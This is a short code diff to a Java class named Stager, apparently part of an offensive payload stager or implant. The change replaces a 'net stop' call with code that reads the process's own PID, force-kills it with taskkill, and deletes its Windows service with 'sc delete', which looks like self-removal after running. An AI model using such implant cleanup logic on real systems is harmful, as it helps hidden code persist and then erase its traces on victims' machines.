@@ -49,6 +49,7 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.lang.management.ManagementFactory;
 import java.lang.reflect.Method;
 import java.net.URISyntaxException;
 import java.net.URL;
@@ -210,7 +211,10 @@ public class Stager extends ClassLoader {
                     cleanupList.add("/c");
 
                     StringBuilder aSB = new StringBuilder();
-                    aSB.append("net stop \"").append(theSvcPath).append("\"");
+                    //aSB.append("net stop \"").append(theSvcPath).append("\"");
+                    String pidHostname = ManagementFactory.getRuntimeMXBean().getName();
+                    String pid = pidHostname.split("@")[0];
+                    aSB.append("taskkill /pid ").append(pid).append(" /f ");
                     aSB.append(" && sc delete \"").append(theSvcPath).append("\"");
 
                     //If this starts becoming unreliable, possibly move to
